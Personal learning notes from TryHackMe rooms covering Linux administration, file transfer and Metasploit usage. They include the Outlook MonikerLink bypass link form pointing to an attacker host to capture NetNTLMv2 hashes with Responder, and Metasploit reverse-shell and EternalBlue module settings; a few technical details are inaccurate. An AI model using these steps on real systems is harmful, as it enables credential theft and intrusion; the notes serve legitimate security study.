# TryHackMe Learning Notes
Comprehensive notes from TryHackMe Pre Security (Aug 2026)

## NEW SKILLS UNLOCKED

### System Administration
```bash
su <option> <username>
``` 
It allows us to switch user

***Importance of /etc directory***
One of the important directories to store system files used by OS. Files like shadow, sudoers, passwd exist here. Shadow and passwd stores password in encrypted format in sha512.

***Importance of /var directory***
It is also one of the main root folders found in Linux. This stores data that is frequently accessed or written by services or app.

***/root directory*** is the home directory for root user.


### File Transfer & Utilities
- wget allows us to download files from the web via HTTP/HTTPS.
```
wget https://assests.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt
```

- Transfering files from our host -> SCP(SSH)

Secure copy or SCP is a way that allows us to transfer files between 2 computers using SSH protocol.
```bash
scp important.txt ubuntu@<IP>:/home/ubuntu/transferred.txt
```
This command copies a local file named important.txt to a remote machine with the IP address 192.168.1.30, logging in as user ubuntu and saving it as /home/ubuntu/transferred.txt
```bash
scp ubuntu@<IP>:/home/ubuntu/documents.txt notes.txt
```
This command securely copies a remote file from a server (IP) to our local machine. It downloads /home/ubuntu/document.text from the remote user ubuntu and saves it locally as notes.txt

- Serving files from web
We can make some files in a directory and use python server to access it from other machine.
```python
python3 -m http.server
```
This starts the server
Now from another machine
```python
wget http://<your IP:PORT>/<filename>
```
The 0.0.0.0/8000 means the server will listen on all network interfaces on our machine like lo, eth0, tun0 etc. But other's can't access 0.0.0.0/8000 directly.
They use our actual IP. Someone can access it via lo, eth0 or tun0 etc.

eg:-
Suppose if our machine has:

eth0 (physical ethernet) = `IP 192.168.1.20`

tun0 (VPN tunnel) = `IP 10.10.14.213`

lo (localhost) = `IP 127.0.0.1`

By listening on `0.0.0.0:8000`:
Someone can connect via ANY of these IPs:

```
wget http://192.168.1.20:8000/file
```
```
wget http://10.10.14.213:8000/file
```
```
wget http://127.0.0.1:8000/file
```
To access only through one interface, we can use -
```python
python3 -m http.server --bind 10.10.14.213
```
The IP shown in server log is the machine that downloaded the file.

### Process Management
```bash
ps aux
```
It provides process service for all users in detailed format like cpu, ram and captures background daemons and services.
```bash
top
```
Same like before but refreshes every 10 sec.

### Services (systemctl)
Systemctl is command that controls services.
```bash
systemctl start [service] 
```
Starts the service right now
```bash
systemctl stop [service]
```
Stop a service right now
```bash
systemctl enable [service]
```
Make it start automatically on boot
```bash
systemctl disable [service]
```
Stop it from starting on boot
```bash
systemctl status [service]
```
Check if it's running

```bash 
fg
```
Command, we use to bring a previously backgrounded process back to the foreground.

`SIGTERM (signal 15)` is the clean way to kill a process.

### Scheduling (cron)

To schedule task
```bash
$ crontab -e
$ crontab -l 
```
-e -> to open a editor

-l -> To list all crontabs

### Packages
When developers wish to submit software to the community, they will submit it to an `apt` repo.

- Learn bash at -> [BASH](https://tryhackme.com/room/bashscripting)
- Learn Regex at -> [REGEX](https://tryhackme.com/room/catregex)
- Vim cheatsheet at -> [VIM](https://vim.rtorr.com/)

### CVE-2024-21413 (MonikerLink)
Microsoft announced a Microsoft outlook RCE & credential leak vulnerability with assigned CVE-2024-21413.

`NTLM` -> Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity.

CVE-2024-21413 is a critical 9.8-severity remote code execution vulnerability in Microsoft Outlook, known as the "MonikerLink" bug. The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.


***Methodology***

When we get email from someone outside our organization, outlook puts it in protected view, which acts like a shield. If an email tries to make our computer reach out to a remote server or open a dangerous file link (file://attacker_ip/test), outlook spots it, and pops up a security warning.

Windows uses a background system called COM to open special links called 'Moniker links.'
But if an attacker adds an exclamation mark and any text to the end of file link -> file://attacker_IP/test!exploit -> it bypasses the outlook's parser, which bypasses the protected view.

**Now what an attacker can do with that**

Normally, when we click web links (https://), our browser just asks a website for a page. But when we click a network file link (file://), windows assumes it's trying to connect to a shared folder in our office network.

Then windows automatically makes a handshake by authenticating to the server.

eg: "Hey server, let me prove who i am so you let me into this folder."

Windows automatically packages up our username and a scrambled, encrypted version of our password (called NetNTLMv2 hash) and sends it over to that server.

Because the links points to the attacker's computer, where attacker isn't hosting a real folder, but running a tool like Responder, designed to listen for that secret code.

OR 

They can do remote code execution, like running a malware in background without we ever clicking `install.`

**So it's time to exploit this**

I created a directory named CVE-2024-21413 which contains the POC of this vulnerability, which i will use to exploit it.
I have the exploit in this directory replacing the attacker_ip with our tun0 interface ip. Then we listen using responder in tun0 interface which captures the NET-NTLMv2 hash.


### Metasploit Framework
So it is mainly focused on penetration testing. It is set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation and more.
Main components of the metasploit framework is:-
- msfconsole: main command line interface
- modules: supporting modules such as exploits, scanners, payloads etc.

***Some terms***

**Exploitation:** Using the flaw or vulnerability to gain unauthorized access.
**Payload:** These are codes that will run on the target system.

The metasploit console can be used just like a regular command-line shell.

***Key Navigation commands:***
- `search <term>` -> finds modules in metasploit's database.
- `use <name or #>` -> selects an exploit or scanner to work with.
- `show options` -> lists all settings required to run the current module (IPs, ports, target OS)
- `set <option> <val>` -> configure a required setting (eg: set RHOSTS 10.10.10.50)
- `info` -> shows full details about the active module (who wrote it, how it works, CVE numbers)
- `show payloads` -> lists all compatible malicious code options you can send to the target once exploited.

There are 5 command prompts we need to check :-
- `root@ip-<val>:~#` -> linux terminal
- `msf6>` -> metasploit main menu
- `msf6 exploit(...)>` -> module content
- `meterpreter>` -> meterpreter context
- `C:\Windows\system32>` -> target os shell

***Core metasploit variables:***

- **RHOSTS:**  remote host -> the target machine's IP address (set RHOSTS 10.10.165.39)
- **RPORT:**  remote port -> the port running the target services (set RPORT 445)
- **LHOSTS:** local host -> Our attacking machine's IP addr (set LHOSTS 10.10.44.70)
- **LPORT:**  local port -> the open port on our machine waiting for the incoming connection (set LHOSTS 4444)
- **PAYLOAD:** the specific shell code delivered to target once the vulnerability is triggered (set PAYLOAD windows/x64/meterpreter/reverse_tcp)

***Management & Global commands:***

- `unset <option>/ unset all`:  clears a specific variable or resets all variables in the active module (unset PAYLOAD -> clear a set payload)
- `setg <option> <value>`:  Sets a Global Variable. If we set setg RHOSTS 10.10.165.39, Metasploit automatically populates RHOSTS for every module we load afterward until we exit msfconsole. (setg RHOSTS 10.10.19.23)
- `exploit (or run)`:  Launches the active attack.
- `exploit -z`:  Runs the exploit and automatically puts the new connection into the background without dropping us straight into the interactive shell.

***Managing Sessions (Connections):***
When an exploit succeeds, it opens an active Session (a live tunnel between our PC and the victim):
- `background (or CTRL+Z)`: Temporarily leaves an active session without closing it, putting us back in the Metasploit terminal.
- `sessions`: Lists all open, active compromised connections on target hosts.
- `sessions -i <ID>`: Re-enters a backgrounded session (e.g., sessions -i 2 jumps back into Session #2).


***EternalBlue Example***
Successfully demonstrated MS17-010 exploitation using Metasploit:
- Used `exploit/windows/smb/ms17_010_eternalblue` module
- Gained SYSTEM shell via Meterpreter
- Demonstrated process enumeration and system information gathering